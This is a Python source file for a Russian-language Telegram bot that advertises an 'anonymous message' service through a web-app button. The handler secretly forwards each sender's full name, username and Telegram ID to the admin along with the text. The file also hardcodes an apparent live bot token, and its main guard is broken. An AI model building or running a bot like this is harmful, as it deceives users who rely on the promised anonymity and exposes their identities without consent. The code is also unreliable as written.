import asyncio
import json
import logging
import sys

from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
    WebAppInfo,
)

# Твой актуальный токен бота и твой ID администратора
BOT_TOKEN = "8283504947:AAEl7JGmgtCx5q4xihUXFda7Luie3Nbcu1A"
ADMIN_CHAT_ID = 8579101084  # Твой Telegram ID, куда будут приходить анонки

# Ссылка на твое мини-приложение (GitHub Pages или другой хостинг)
WEB_APP_URL = "https://wecstor.github.io/lyubotin/"  # Замени на свою ссылку, если отличается

dp = Dispatcher()


# Команда /start для пользователей
@dp.message(Command("start"))
async def cmd_start(message: Message):
  keyboard = InlineKeyboardMarkup(
      inline_keyboard=[
          [
              InlineKeyboardButton(
                  text="💌 Написать анонимное сообщение",
                  web_app=WebAppInfo(url=WEB_APP_URL),
              )
          ]
      ]
  )
  await message.answer(
      "👋 Привет! Добро пожаловать в люботин!\n\nНажми на кнопку ниже, чтобы"
      " отправить анонимное сообщение.",
      reply_markup=keyboard,
  )


# Ловим данные, которые отправляет мини-приложение через tg.sendData()
@dp.message(F.web_app_data)
async def handle_web_app_data(message: Message):
  try:
    # Распаковываем JSON, пришедший из сайта
    data = json.loads(message.web_app_data.data)
    text = data.get("text", "Без текста")

    # Берем данные реального пользователя, который нажал кнопку
    user = message.from_user
    username_info = f"@{user.username}" if user.username else "скрыт"
    full_name = f"{user.first_name or ''} {user.last_name or ''}".strip()

    # Красиво форматируем сообщение для тебя
    admin_message = (
        f"💌 Новая анонка!\n\n"
        f"💬 Текст:\n{text}\n\n"
        f"👤 От кого: {full_name}\n"
        f"🔗 Юзернейм: {username_info}\n"
        f"🆔 ID: {user.id}"
    )

    # Отправляем тебе в личку
    await bot.send_message(
        chat_id=ADMIN_CHAT_ID, text=admin_message, parse_mode="Markdown"
    )

  except Exception as e:
    print(f"Ошибка при обработке веб-апп данных: {e}")


async def main():
  global bot
  bot = Bot(token=BOT_TOKEN)
  print("Бот запущен и ждет сообщения...")
  await dp.start_polling(bot)


if name == "main":
  logging.basicConfig(level=logging.INFO, stream=sys.stdout)
  asyncio.run(main())